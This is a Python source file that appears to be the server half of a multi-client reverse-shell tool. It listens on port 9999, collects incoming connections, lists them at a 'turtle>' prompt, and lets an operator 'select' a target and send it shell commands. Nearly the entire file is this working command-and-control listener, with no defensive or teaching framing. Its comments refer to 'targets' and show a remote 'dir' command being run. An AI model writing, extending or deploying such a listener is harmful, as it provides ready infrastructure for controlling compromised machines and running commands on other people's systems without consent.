'''
Created on Wed Apr 29 16:59:22 2020
@author: Harshil Bhatt
'''

import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


# Create a Socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket and listen
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the PORT: ", port)

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\nRetrying...")
        bind_socket()


# Handling connection from multiple files
# closing previous connections on restarting server.py
def accept_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)    # Prevent timeout
            
            all_connections.append(conn)
            all_address.append(addr)

            print("Connection established:", addr[0])
        except:
            print("Error accepting connection")

# 2nd thread: used to send command
# Create shell to send commands

def start_turtle():    

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        else:
            print("Command not recognised")

# Display all current active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        # Output: 1 <IP> <PORT>
        #         2 <IP> <PORT>
        results = str(i) + "\t" + str(all_address[i][0]) + "\t" + str(all_address[i][1]) + "\n"

    print("----Clients----\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir

    except:
        print("Selection not valid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), 'utf-8')
                print(client_response, end="")

        except:
            print("Error sending commands")
            break

# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        # daemon needs to be true to kill the threads after work is done
        # It will free up memory
        t.daemon = True
        t.start()


# Do next job in queue
# Thread 1: handle connection
# Thread 2: send commands
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_turtle()
        
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()